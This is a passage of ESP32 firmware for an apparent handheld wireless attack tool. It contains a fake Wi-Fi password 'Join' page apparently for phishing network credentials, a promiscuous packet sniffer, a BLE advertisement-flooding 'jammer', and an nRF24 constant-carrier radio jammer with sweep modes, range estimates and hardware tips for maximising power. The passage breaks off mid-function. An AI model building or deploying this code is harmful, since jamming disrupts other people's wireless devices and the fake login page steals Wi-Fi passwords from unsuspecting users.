  html += "<div class='content'>";
  html += "<div class='form-group'>";
  html += "<label><span>Password:</span>";
  html += "<input type='password' name='password' id='password' required autofocus autocomplete='off'>";
  html += "</label></div>";
  html += "<div class='checkbox-group'>";
  html += "<input type='checkbox' id='showPwd'>";
  html += "<label for='showPwd' class='checkbox-label'>Show password</label>";
  html += "</div>";
  html += "<div class='checkbox-group'>";
  html += "<input type='checkbox' id='remember' checked>";
  html += "<label for='remember' class='checkbox-label'>Remember this network</label>";
  html += "</div></div>";
  html += "<div class='footer'>";
  html += "<div class='help-btn'>?</div>";
  html += "<div class='action-btns'>";
  html += "<button type='button' class='btn btn-cancel' onclick='window.history.back()'>Cancel</button>";
  html += "<button type='submit' class='btn btn-join' id='joinBtn'>Join</button>";
  html += "</div></div></form></div>";
  html += "<script>";
  html += "const pwd=document.getElementById('password');";
  html += "const show=document.getElementById('showPwd');";
  html += "const join=document.getElementById('joinBtn');";
  html += "show.addEventListener('change',()=>{pwd.type=show.checked?'text':'password';});";
  html += "pwd.addEventListener('input',()=>{join.classList.toggle('active',pwd.value.length>0);});";
  html += "</script></body></html>";
  
  webServer.send(200, "text/html", html);
}

// ==================== Sniffer Functions ====================

void startSniffer() {
  snifferActive = true;
  packetCount = 0;
  beaconCount = 0;
  dataCount = 0;
  deauthCount = 0;
  snifferChannel = 1;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  currentState = SNIFFER_ACTIVE;
  addToConsole("Sniffer started - Fast hop");
  
  Serial.println("[+] Sniffer started with fast channel hopping");
  Serial.println("    Hopping through channels 1-13 at 200ms intervals");
  
  displaySnifferActive();
}

void stopSniffer() {
  snifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Sniffer stopped");
  
  Serial.printf("[+] Sniffer stopped - %d packets captured\n", packetCount);
}

void displaySnifferActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("packet sniffer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT single line
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch%d", snifferChannel);
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(55, statsY);
  tft.printf("T:%d", packetCount);
  
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(95, statsY);
  tft.printf("B:%d", beaconCount);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(135, statsY);
  tft.printf("D:%d", dataCount);
  
  tft.setTextColor(COLOR_RED);
  tft.setCursor(175, statsY);
  tft.printf("X:%d", deauthCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TYPE");
  tft.setCursor(40, listY);
  tft.print("RSSI");
  tft.setCursor(75, listY);
  tft.print("CH");
  tft.setCursor(100, listY);
  tft.print("AGE");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;

  const int MAX_DISPLAY = 12;
  int totalPackets = min((uint32_t)MAX_SNIFFER_PACKETS, packetCount);
  
  if (totalPackets == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 60);
    tft.print("Waiting for packets...");
    tft.setCursor(SIDE_MARGIN, listY + 75);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print("Fast channel hopping...");
  } else {
    // Display last N packets (newest at bottom, auto-scroll up)
    int startIdx = max(0, totalPackets - MAX_DISPLAY);
    int displayCount = min(MAX_DISPLAY, totalPackets);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = (packetHistoryIndex - totalPackets + startIdx + i + MAX_SNIFFER_PACKETS) % MAX_SNIFFER_PACKETS;
      
      if (packetHistory[idx].timestamp == 0) continue;
      
      int y = listY + (i * 22);
      
      // Type with color coding
      uint16_t typeColor = COLOR_TEXT;
      const char* typeName = "UNK";
      
      if (packetHistory[idx].type == 0x80) {
        typeColor = COLOR_GREEN;
        typeName = "BCN";
      } else if ((packetHistory[idx].type & 0x0C) == 0x08) {
        typeColor = COLOR_CYAN;
        typeName = "DAT";
      } else if (packetHistory[idx].type == 0xC0 || packetHistory[idx].type == 0xA0) {
        typeColor = COLOR_RED;
        typeName = "DEA";
      } else if (packetHistory[idx].type == 0x40) {
        typeColor = COLOR_PURPLE;
        typeName = "PRB";
      }
      
      tft.setTextColor(typeColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y+4);
      tft.print(typeName);
      
      // RSSI
      int rssi = packetHistory[idx].rssi;
      uint16_t rssiColor = (rssi > -50) ? COLOR_GREEN : (rssi > -70) ? COLOR_YELLOW : COLOR_RED;
      
      tft.setTextColor(rssiColor);
      tft.setCursor(40, y+4);
      tft.printf("%3d", rssi);
      
      // Channel
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(75, y+4);
      tft.printf("%2d", packetHistory[idx].channel);
      
      // Time ago
      unsigned long ago = (millis() - packetHistory[idx].timestamp) / 1000;
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(100, y+4);
      if (ago < 60) {
        tft.printf("%2ds", ago);
      } else if (ago < 3600) {
        tft.printf("%2dm", ago / 60);
      } else {
        tft.printf("%2dh", ago / 3600);
      }
    }
  }
  
  // ✅ LEGEND - Right side, aligned properly
  int legendY = listY + 60;
  int legendX = 160;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(legendX, legendY);
  tft.print("LEGEND:");
  
  legendY += 16;
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(legendX, legendY);
  tft.print("B");
  tft.setTextColor(COLOR_TEXT);
  tft.print("=Beacon");
  
  legendY += 12;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(legendX, legendY);
  tft.print("D");
  tft.setTextColor(COLOR_TEXT);
  tft.print("=Data");
  
  legendY += 12;
  tft.setTextColor(COLOR_RED);
  tft.setCursor(legendX, legendY);
  tft.print("X");
  tft.setTextColor(COLOR_TEXT);
  tft.print("=Deauth");
  
  legendY += 12;
  tft.setTextColor(COLOR_PURPLE);
  tft.setCursor(legendX, legendY);
  tft.print("P");
  tft.setTextColor(COLOR_TEXT);
  tft.print("=Probe");
  
  legendY += 12;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(legendX, legendY);
  tft.print("T=Total");

  legendY += 30;
  tft.setTextColor(COLOR_RED);
  tft.setCursor(legendX -15, legendY);
  tft.print("Tap anywhere");

  legendY += 12;
  tft.setTextColor(COLOR_RED);
  tft.setCursor(legendX, legendY);
  tft.print("To stop");
}


// ==================== BLE Functions ====================

void scanBLEDevices() {
  Serial.println("\n========== STARTING BLE SCAN ==========");
  
  // ✅ FIX: Pause nRF24
  bool wasNRFActive = nrfJammerActive;
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24 for BLE scan...");
    nrfJammerActive = false;
    delay(100);
  }
  
  // Clean up any previous BLE operations
  if (bleJammerActive || appleSpamActive || androidSpamActive) {
    if (BLEDevice::getInitialized()) {
      BLEDevice::deinit(true);
      delay(200);
    }
  } else if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(200);
  }
  
  addToConsole("BLE continuous scan started");
  
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  
  continuousBLEScan = true;
  
  displayBLEScanResults();
  
  pBLEScan->start(0, nullptr, false);
  
  Serial.println("[+] BLE scan started");
  Serial.println("=====================================\n");
}

void displayBLEScanResults() {
  currentState = BLE_SCAN_RESULTS;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble scan");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", bleDeviceCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("NAME");
  tft.setCursor(140, listY);
  tft.print("RSSI");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Display devices with pagination
  const int MAX_BLE_DISPLAY = 9;
  
  // Ensure scroll offset is valid
  if (bleScrollOffset >= bleDeviceCount) {
    bleScrollOffset = max(0, bleDeviceCount - MAX_BLE_DISPLAY);
  }
  
  int displayCount = min(bleDeviceCount - bleScrollOffset, MAX_BLE_DISPLAY);
  
  for (int i = 0; i < displayCount; i++) {
    int idx = bleScrollOffset + i;
    int y = listY + (i * 26);
    
    // Name
    String displayName = bleDevices[idx].name;
    if (displayName.length() == 0) displayName = "Unknown";
    if (displayName.length() > 18) displayName = displayName.substring(0, 17) + "~";
    
    tft.setTextColor(COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y + 2);
    tft.print(displayName);
    
    // Address
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y + 12);
    String addr = bleDevices[idx].address;
    if (addr.length() > 17) addr = addr.substring(0, 17);
    tft.print(addr);
    
    // RSSI
    int rssi = bleDevices[idx].rssi;
    tft.setTextColor(rssi > -50 ? COLOR_GREEN : rssi > -70 ? COLOR_YELLOW : COLOR_RED);
    tft.setCursor(140, y + 7);
    tft.printf("%d", rssi);
  }
  
  // Scroll indicator
  if (bleDeviceCount > MAX_BLE_DISPLAY) {
    int scrollY = listY + (MAX_BLE_DISPLAY * 26) + 5;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setTextSize(1);
    tft.setCursor(85, scrollY);
    tft.printf("[%d-%d/%d]", 
               bleScrollOffset + 1, 
               bleScrollOffset + displayCount, 
               bleDeviceCount);
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

// ==================== BLE JAMMER Functions ====================
void initBLEJammer() {
  // Pre-build advertisement spam packet
  memset(adv_spam_packet, 0, sizeof(adv_spam_packet));
  adv_spam_packet[0] = 0x02; // Length
  adv_spam_packet[1] = 0x01; // Flags type
  adv_spam_packet[2] = 0x06; // LE General Discoverable
  
  // Pre-build disconnect packet (LL_TERMINATE_IND)
  memset(disconnect_packet, 0, sizeof(disconnect_packet));
  disconnect_packet[0] = 0x02; // LL Control PDU
  disconnect_packet[1] = 0x13; // Reason: Remote user terminated
  
  // Pre-build connection flood packet
  memset(connect_flood_packet, 0, sizeof(connect_flood_packet));
  connect_flood_packet[0] = 0x05; // CONNECT_IND
}

void forceResetBluetooth() {
  Serial.println("[*] Force resetting Bluetooth stack...");
  
  // Step 1: Stop advertising if active
  if (BLEDevice::getInitialized()) {
    esp_ble_gap_stop_advertising();
    delay(50);
  }
  
  // Step 2: Deinit BLEDevice completely
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(200);
  }
  
  // Step 3: Force disable Bluedroid
  for (int attempt = 0; attempt < 3; attempt++) {
    esp_bluedroid_status_t bd_status = esp_bluedroid_get_status();
    Serial.printf("  Bluedroid status: %d\n", bd_status);
    
    if (bd_status == ESP_BLUEDROID_STATUS_ENABLED) {
      esp_err_t ret = esp_bluedroid_disable();
      Serial.printf("  Bluedroid disable: %d\n", ret);
      delay(100);
    } else if (bd_status == ESP_BLUEDROID_STATUS_INITIALIZED) {
      esp_err_t ret = esp_bluedroid_deinit();
      Serial.printf("  Bluedroid deinit: %d\n", ret);
      delay(100);
    } else {
      break; // Already uninitialized
    }
  }
  
  // Step 4: Force disable BT controller
  for (int attempt = 0; attempt < 3; attempt++) {
    esp_bt_controller_status_t status = esp_bt_controller_get_status();
    Serial.printf("  BT controller status: %d\n", status);
    
    if (status == ESP_BT_CONTROLLER_STATUS_ENABLED) {
      esp_err_t ret = esp_bt_controller_disable();
      Serial.printf("  BT controller disable: %d\n", ret);
      delay(100);
    } else if (status == ESP_BT_CONTROLLER_STATUS_INITED) {
      esp_err_t ret = esp_bt_controller_deinit();
      Serial.printf("  BT controller deinit: %d\n", ret);
      delay(100);
    } else {
      break; // Already idle
    }
  }
  
  delay(300); // Final settling time
  Serial.println("[+] Bluetooth stack reset complete");
}

void startBLEJammer() {
  if (bleJammerActive) return;
  
  Serial.println("\n========== STARTING BLE JAMMER ==========");
  
  // ✅ FIX: Pause nRF24 to avoid SPI conflicts
  bool wasNRFActive = nrfJammerActive;
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24 for BLE...");
    nrfJammerActive = false;  // Just stop the loop, keep carrier on
    delay(100);
  }
  
  // Stop any conflicting operations
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
      delay(100);
    }
  }
  
  // Clean up using Arduino BLE library
  if (BLEDevice::getInitialized()) {
    Serial.println("[*] Deinitializing existing BLE...");
    BLEDevice::deinit(true);
    delay(300);
  }
  
  // Initialize using Arduino BLE library
  Serial.println("[*] Initializing BLE for jammer...");
  BLEDevice::init("P4WNC4K3_JAM");
  
  // Get advertising handle
  pAdvertising = BLEDevice::getAdvertising();
  
  if (pAdvertising == nullptr) {
    Serial.println("[!] Failed to get advertising handle");
    addToConsole("BLE jam start failed!");
    
    // ✅ FIX: Resume nRF24 if it was active
    if (wasNRFActive) {
      delay(100);
      nrfJammerActive = true;
      Serial.println("[*] Resumed nRF24 jammer");
    }
    return;
  }
  
  pAdvertising->setMinInterval(100);
  pAdvertising->setMaxInterval(200);
  
  initBLEJammer();
  
  bleJammerActive = true;
  bleJamPackets = 0;
  bleDisconnectsSent = 0;
  bleConnectFloodSent = 0;
  lastBLEJamTime = millis();
  current_ble_channel = 0;
  
  currentState = BLE_JAM_ACTIVE;
  
  Serial.println("[+] BLE Jammer started (STABLE MODE)");
  Serial.println("========================================\n");
  addToConsole("BLE jammer: STABLE");
  
  displayBLEJammerActive();
}

void stopBLEJammer() {
  if (!bleJammerActive) return;
  
  bleJammerActive = false;
  
  Serial.println("\n[*] Stopping BLE jammer...");
  
  // Stop advertising FIRST
  if (pAdvertising != nullptr) {
    pAdvertising->stop();
    delay(100);
  }
  
  // Clean shutdown using Arduino library
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(200);
  }
  
  Serial.printf("\n[+] BLE Jammer stopped\n");
  Serial.printf("    Discovery spam packets: %d\n", bleJamPackets);
  
  addToConsole("BLE jammer stopped");
}

void performBLEJam() {
  if (nrfJammerActive) {
    Serial.println("[!] ERROR: Cannot run BLE while nRF24 is active (SPI conflict)");
    stopBLEJammer();
    return;
  }
  
  if (!bleJammerActive || pAdvertising == nullptr) return;
  
  static unsigned long lastJamCycle = 0;
  static bool advertisingActive = false;
  static uint8_t cyclePhase = 0;
  
  // CRITICAL: Slow down the cycle to prevent watchdog
  // Update every 50ms instead of 2ms (25x slower = stable)
  if (millis() - lastJamCycle < 50) return;
  lastJamCycle = millis();
  
  // Feed watchdog to prevent timeout
  esp_task_wdt_reset();
  
  // Phase 0: Update advertisement data
  if (cyclePhase == 0) {
    // Stop previous advertising
    if (advertisingActive) {
      pAdvertising->stop();
      advertisingActive = false;
      delay(10);  // CRITICAL: Give BLE stack time to cleanup
    }
    
    // Create new advertisement data
    BLEAdvertisementData advertisementData;
    
    // Random device name
    String randomName = "";
    for (int i = 0; i < 10; i++) {
      randomName += char('A' + random(0, 26));
    }
    advertisementData.setName(randomName.c_str());
    
    // Random manufacturer data
    uint8_t mfgData[12];
    for (int i = 0; i < 12; i++) {
      mfgData[i] = random(0, 256);
    }
    advertisementData.setManufacturerData(std::string((char*)mfgData, 12));
    
    // Set data (don't start yet)
    pAdvertising->setAdvertisementData(advertisementData);
    
    cyclePhase = 1;
  }
  // Phase 1: Start advertising
  else if (cyclePhase == 1) {
    pAdvertising->start();
    advertisingActive = true;
    bleJamPackets++;
    
    cyclePhase = 2;
  }
  // Phase 2: Let it advertise for a bit
  else if (cyclePhase == 2) {
    // Keep advertising for 2 cycles (100ms)
    cyclePhase = 3;
  }
  // Phase 3: Prepare for next cycle
  else {
    cyclePhase = 0;  // Back to start
  }
  
  // Small yield to let other tasks run
  yield();
}

void performBLEJam_Continuous() {
  if (!bleJammerActive || pAdvertising == nullptr) return;
  
  static unsigned long lastUpdate = 0;
  static bool isAdvertising = false;
  
  // Update advertisement data every 200ms
  if (millis() - lastUpdate < 200) return;
  lastUpdate = millis();
  
  // Feed watchdog
  esp_task_wdt_reset();
  
  // If not advertising yet, start it
  if (!isAdvertising) {
    pAdvertising->start();
    isAdvertising = true;
    bleJamPackets++;
  }
  
  // Change advertisement data WITHOUT stopping
  // This is more stable - advertising continues in background
  BLEAdvertisementData advertisementData;
  
  // Random device name
  String randomName = "";
  for (int i = 0; i < 10; i++) {
    randomName += char('A' + random(0, 26));
  }
  advertisementData.setName(randomName.c_str());
  
  // Random manufacturer data
  uint8_t mfgData[12];
  for (int i = 0; i < 12; i++) {
    mfgData[i] = random(0, 256);
  }
  advertisementData.setManufacturerData(std::string((char*)mfgData, 12));
  
  // Update while advertising (more stable)
  pAdvertising->setAdvertisementData(advertisementData);
  bleJamPackets++;
  
  // Small yield
  yield();
}

void displayBLEJammerActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble jammer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  int y = HEADER_HEIGHT + 15;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Status: ");
  tft.setTextColor(COLOR_ORANGE);
  tft.println("JAMMING ACTIVE");
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Mode: ");
  tft.setTextColor(COLOR_GREEN);
  tft.println(jammerModeText);
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Packets sent: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", bleJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Duration: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d sec", (millis() - lastBLEJamTime) / 1000);
  
  y += 30;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  
  y += 10;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, y);
  tft.print("Flooding BLE spectrum with");
  
  y += 12;
  tft.setCursor(30, y);
  tft.print("random advertisements...");
  
  // Back/Stop button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_DARK_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(70, backY + 3);
  tft.print("[ESC] Stop & Back");
}

void updateBLEJammerDisplay() {
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate < 500) return;
  lastUpdate = millis();
  // Clear only the stats area to prevent flicker
  int statsY = HEADER_HEIGHT + 35;
  tft.fillRect(SIDE_MARGIN, statsY, 230, 150, COLOR_BG);
  
  tft.setTextSize(1);
  int y = statsY;
  
  // Mode
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Mode: ");
  tft.setTextColor(COLOR_GREEN);
  tft.println("AGGRESSIVE");
  
  y += 20;
  
  // Total packets
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Packets: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", bleJamPackets);
  
  unsigned long runtime = (millis() - lastBLEJamTime) / 1000;
  if (runtime > 0) {
    tft.setTextColor(COLOR_GREEN);
    tft.printf(" (%d/s)", bleJamPackets / runtime);
  }
  
  y += 20;
  
  // Disconnects sent
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Disconnects: ");
  tft.setTextColor(COLOR_ORANGE);
  tft.printf("%d", bleDisconnectsSent);
  
  y += 20;
  
  // Connection floods
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Conn floods: ");
  tft.setTextColor(COLOR_PURPLE);
  tft.printf("%d", bleConnectFloodSent);
  
  y += 20;
  
  // Current channel
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Channel: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("Ch %d", ble_channels[current_ble_channel]);
  
  y += 20;
  
  // Duration
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Duration: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d sec", runtime);
  
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Status message
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Jamming BLE spectrum...");
  
  y += 12;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Devices may disconnect");
}

// ==================== nRF24 Jammer Functions ====================

void startNRFJammer() {
  if (nrfJammerActive) return;
  
  Serial.println("\n╔═══════════════════════════════════════╗");
  Serial.println("║   nRF24 JAMMER - SMOOCHIEE METHOD    ║");
  Serial.println("╚═══════════════════════════════════════╝");
  
  // ✅ CRITICAL: Stop ALL BLE operations first (SPI conflict!)
  if (bleJammerActive) {
    Serial.println("[!] Stopping BLE jammer...");
    stopBLEJammer();
    delay(200);
  }
  if (appleSpamActive) {
    stopAppleSpam();
    delay(100);
  }
  if (androidSpamActive) {
    stopAndroidSpam();
    delay(100);
  }
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) {
      pBLEScan->stop();
      delay(100);
    }
  }
  
  // Ensure BLE is completely off
  if (BLEDevice::getInitialized()) {
    Serial.println("[*] Deinitializing BLE...");
    BLEDevice::deinit(true);
    delay(200);
  }
  
  if (!nrf1Available && !nrf2Available) {
    showMessage("No nRF24 modules!", COLOR_WARNING);
    Serial.println("[✗] No nRF24 radios available!");
    return;
  }
  
  // ⭐ SMOOCHIEE METHOD: Start/Restart constant carrier
  Serial.println("\n[*] Starting constant carrier transmission...");
  
  if (nrf1Available) {
    radio1.stopConstCarrier();  // Stop if already running
    delay(50);
    radio1.startConstCarrier(RF24_PA_MAX, hopping_channel[0]);
    delay(50);
    Serial.printf("    Radio 1: Carrier ON (Ch %d)\n", hopping_channel[0]);
  }
  
  if (nrf2Available) {
    radio2.stopConstCarrier();  // Stop if already running
    delay(50);
    radio2.startConstCarrier(RF24_PA_MAX, hopping_channel[ptr_hop2]);
    delay(50);
    Serial.printf("    Radio 2: Carrier ON (Ch %d)\n", hopping_channel[ptr_hop2]);
  }
  
  // Reset counters
  nrfJammerActive = true;
  nrfTurboMode = true;
  nrfJamPackets = 0;
  nrf1Packets = 0;
  nrf2Packets = 0;
  lastNRFJamTime = millis();
  nrfLastStats = 0;
  
  // Reset sweep pattern to start position
  flag_radio1 = 0;
  flag_radio2 = 0;
  nrf_ch1 = 2;
  nrf_ch2 = 45;
  
  currentState = NRF_JAM_ACTIVE;
  
  Serial.println("\n╔═══════════════════════════════════════╗");
  Serial.println("║         JAMMING STARTED!             ║");
  Serial.println("╚═══════════════════════════════════════╝");
  Serial.printf("Mode: %s\n", dualNRFMode ? "DUAL (2 radios)" : "SINGLE");
  
  // Show jamming mode
  const char* modeName = "";
  switch (nrfJamMode) {
    case NRF_SWEEP:   modeName = "SWEEP (Smoochiee)"; break;
    case NRF_RANDOM:  modeName = "RANDOM"; break;
    case NRF_FOCUSED: modeName = "FOCUSED (BLE)"; break;
  }
  Serial.printf("Pattern: %s\n", modeName);
  
  Serial.println("\n⚡ METHOD: Constant Carrier + Channel Hop");
  Serial.println("⚡ Expected: 50K-150K hops/sec");
  Serial.println("⚡ TFT FROZEN - Stats to serial!");
  Serial.println("💡 TO STOP: Tap screen or type 'nrfjam'");
  Serial.println("───────────────────────────────────────────\n");
  
  displayNRFJammerActive();
  addToConsole("nRF24: SMOOCHIEE MODE");
}

void stopNRFJammer() {
  if (!nrfJammerActive) return;
  
  nrfJammerActive = false;
  nrfTurboMode = false;
  Serial.println("\n[*] Stopping nRF24 jammer...");
  
  // ✅ Stop constant carrier properly
  if (nrf1Available) {
    radio1.stopConstCarrier();
    Serial.println("    Radio 1: Carrier stopped");
  }
  if (nrf2Available) {
    radio2.stopConstCarrier();
    Serial.println("    Radio 2: Carrier stopped");
  }
  
  delay(100);  // Let radios settle
  
  // Print final statistics
  unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
  if (runtime == 0) runtime = 1;
  
  unsigned long hopsPerSec = nrfJamPackets / runtime;
  
  Serial.println("\n╔═══════════════════════════════════════╗");
  Serial.println("║   JAMMING STOPPED - FINAL STATS      ║");
  Serial.println("╚═══════════════════════════════════════╝");
  Serial.printf("Total runtime: %lu seconds\n", runtime);
  Serial.printf("Total hops: %lu\n", nrfJamPackets);
  Serial.printf("Average rate: %lu hops/sec\n", hopsPerSec);
  
  if (nrf1Available) {
    Serial.printf("Radio 1: %lu hops\n", nrf1Packets);
  }
  if (nrf2Available) {
    Serial.printf("Radio 2: %lu hops\n", nrf2Packets);
  }
  
  Serial.println("\n📊 PERFORMANCE ANALYSIS:");
  if (hopsPerSec > 100000) {
    Serial.println("✅ EXCELLENT - Peak performance!");
    Serial.println("   Your hardware is working perfectly");
    Serial.println("   Effective range: 10-20m");
  } else if (hopsPerSec > 50000) {
    Serial.println("✅ VERY GOOD - Strong jamming");
    Serial.println("   Effective range: 5-15m");
  } else if (hopsPerSec > 25000) {
    Serial.println("✓ GOOD - Working well");
    Serial.println("   Effective range: 3-10m");
  } else if (hopsPerSec > 10000) {
    Serial.println("⚠️ FAIR - Could be better");
    Serial.println("   Check: PA+LNA modules installed?");
    Serial.println("   Check: Capacitors on each module?");
  } else {
    Serial.println("✗ WEAK - Hardware problem!");
    Serial.println("\n   TROUBLESHOOTING:");
    Serial.println("   1. Using PA+LNA modules? (required!)");
    Serial.println("   2. 10µF-100µF capacitors on EACH?");
    Serial.println("   3. 3.3V stable power supply?");
    Serial.println("   4. Good quality USB cable/charger?");
    Serial.println("   5. Wiring matches pin definitions?");
  }
  Serial.println("═════════════════════════════════════════════\n");
  Serial.println("\n💡 TIP: Tap screen or type 'nrfjam' to stop next time!\n");
  
  addToConsole("nRF24 stopped");
  
  // Redraw menu
  if (currentState == NRF_JAM_ACTIVE) {
    currentState = NRF_JAM_MENU;
    drawNRFJammerMenu();
  }
}

void displayNRFJammerActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("nrf24 jammer");
  
  // Static message - NO live updates for max speed!
  int y = HEADER_HEIGHT + 20;
  
  tft.setTextSize(2);
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("JAMMING");
  
  y += 30;
  tft.setTextSize(2);
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("ACTIVE!");
  
  y += 40;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  
  // Show current mode
  switch (nrfJamMode) {
    case NRF_SWEEP:
      tft.println("SWEEP MODE");
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.setTextColor(COLOR_TEXT);
      tft.println("(Smoochiee pattern)");
      break;
    case NRF_RANDOM:
      tft.println("RANDOM MODE");
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.setTextColor(COLOR_TEXT);
      tft.println("(Chaotic hopping)");
      break;
    case NRF_FOCUSED:
      tft.println("FOCUSED MODE");
      y += 12;
      tft.setCursor(SIDE_MARGIN, y);
      tft.setTextColor(COLOR_TEXT);
      tft.println("(BLE channels)");
      break;
  }
  
  y += 30;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Display frozen for");
  
  y += 15;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("MAXIMUM PERFORMANCE");
  
  y += 30;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
